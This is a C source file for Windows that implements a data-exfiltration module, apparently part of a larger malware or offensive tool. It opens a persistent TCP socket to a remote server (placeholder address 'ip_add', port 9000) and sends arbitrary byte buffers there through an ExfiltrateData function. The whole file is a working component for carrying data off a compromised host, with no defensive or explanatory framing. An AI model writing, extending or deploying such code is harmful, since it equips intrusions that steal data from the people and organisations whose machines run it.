#define WIN32_LEAN_AND_MEAN

#include "exfiltration.h"
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

// Global persistent socket and state.
static SOCKET g_ExfilSocket = INVALID_SOCKET;
static BOOL g_ExfilInitialized = FALSE;
// Global critical section for thread-safe access.
static CRITICAL_SECTION g_ExfilLock;

BOOL Exfiltration_Initialize()
{
    WSADATA wsaData;
    int result;

    result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0)
    {
        printf("WSAStartup failed: %d\n", result);
        return FALSE;
    }
    
    // Initialize the critical section for the exfiltration connection.
    InitializeCriticalSection(&g_ExfilLock);

    g_ExfilSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_ExfilSocket == INVALID_SOCKET)
    {
        printf("Socket creation failed.\n");
        WSACleanup();
        return FALSE;
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("ip_add"); // Change as needed.
    server.sin_port = htons(9000);                   // Example port.

    result = connect(g_ExfilSocket, (struct sockaddr*)&server, sizeof(server));
    if (result == SOCKET_ERROR)
    {
        printf("Connection to exfiltration server failed.\n");
        closesocket(g_ExfilSocket);
        g_ExfilSocket = INVALID_SOCKET;
        DeleteCriticalSection(&g_ExfilLock);
        WSACleanup();
        return FALSE;
    }

    g_ExfilInitialized = TRUE;
    printf("Persistent exfiltration connection established.\n");
    return TRUE;
}

BOOL ExfiltrateData(const BYTE* pData, DWORD dwSize)
{
    if (!g_ExfilInitialized || g_ExfilSocket == INVALID_SOCKET)
    {
        printf("Exfiltration connection not initialized.\n");
        return FALSE;
    }
    
    // Lock the critical section to ensure only one thread writes at a time.
    EnterCriticalSection(&g_ExfilLock);
    int sent = send(g_ExfilSocket, (const char*)pData, dwSize, 0);
    LeaveCriticalSection(&g_ExfilLock);
    
    if (sent == SOCKET_ERROR)
    {
        printf("Failed to send exfiltration data. Error: %d\n", WSAGetLastError());
        return FALSE;
    }

    printf("Exfiltrated %d bytes over persistent connection.\n", sent);
    return TRUE;
}

VOID Exfiltration_Cleanup()
{
    if (g_ExfilSocket != INVALID_SOCKET)
    {
        closesocket(g_ExfilSocket);
        g_ExfilSocket = INVALID_SOCKET;
    }
    DeleteCriticalSection(&g_ExfilLock);
    WSACleanup();
    g_ExfilInitialized = FALSE;
    printf("Persistent exfiltration connection closed.\n");
}
